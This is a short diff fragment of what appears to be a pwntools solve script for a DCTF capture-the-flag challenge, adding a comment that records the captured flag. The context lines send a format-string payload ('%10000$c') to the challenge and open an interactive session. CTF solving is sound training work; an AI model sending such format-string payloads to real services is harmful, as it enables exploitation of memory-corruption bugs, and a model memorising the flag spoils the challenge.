@@ -25,4 +25,6 @@ r.readline()
 r.sendline(b'%10000$c')
 r.interactive()
 
+# dctf{N0t_all_7h30r3ms_s0und_g00d}
+
 
